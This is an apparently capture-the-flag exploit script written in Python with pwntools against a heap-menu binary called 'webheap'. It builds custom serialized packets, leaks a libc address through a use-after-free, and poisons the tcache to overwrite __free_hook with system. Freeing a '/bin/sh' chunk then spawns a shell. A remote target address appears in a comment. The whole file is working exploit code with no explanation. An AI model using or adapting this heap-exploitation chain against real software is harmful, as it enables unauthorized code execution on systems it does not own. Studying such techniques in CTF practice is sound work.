from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(['./webheap'])
elf = ELF('./webheap')
libc = ELF('/home/nova/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so')
# sh = remote('172.51.65.90',9999)

"""
struct Person {
  std::uint64_t cmd;
  std::uint64_t idx;
  std::uint64_t sz;
  std::string name;
  std::uint64_t nothing;
  NOP_STRUCTURE(Person, cmd, idx, sz, name, nothing);
};
"""

def pack_int(num: int):
    return b'\x82' + p32(num)


def pack_str(content: bytes):
    return b'\xBD' + len(content).to_bytes(1,'little') + content


def payload(cmd: int, idx: int, size: int = 0x20, content: bytes = b'A'*0x20) -> bytes:
    payload = b'\xB9\x05'
    payload += cmd.to_bytes(1, 'little')
    payload += b'\x82' + p32(idx) + b'\x82' + p32(size)
    payload += pack_str(content)
    payload += b'\x00'
    return payload


def send_packet(content: bytes):
    sh.sendlineafter(b'Packet length: ', str(len(content)).encode())
    sh.sendafter(b'Content: ', content)


def add(idx: int, size: int):
    send_packet(payload(0, idx, size))


def show(idx: int):
    send_packet(payload(1, idx))


def delete(idx: int):
    send_packet(payload(2, idx))


def edit(idx: int, content: bytes):
    send_packet(payload(3, idx, 0, content))



add(0, 0x580)  # 0
add(1, 0x10)  # 1
delete(0)
show(0)


libc_base = u64(sh.recv(6).ljust(8,b'\x00')) - 0x3ebca0
print("libc_base >>> ", hex(libc_base))

free_hook_addr = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']

add(2, 0x80)  # 2
add(3, 0x80)  # 3

delete(2)
delete(3)

edit(3, p64(free_hook_addr))

add(4, 0x80)  # 4
add(5, 0x80)  # 5 <--> 3
add(6, 0x80)  # 6
edit(6, b'/bin/sh\x00')
edit(5, p64(system_addr))
delete(6)


sh.interactive()
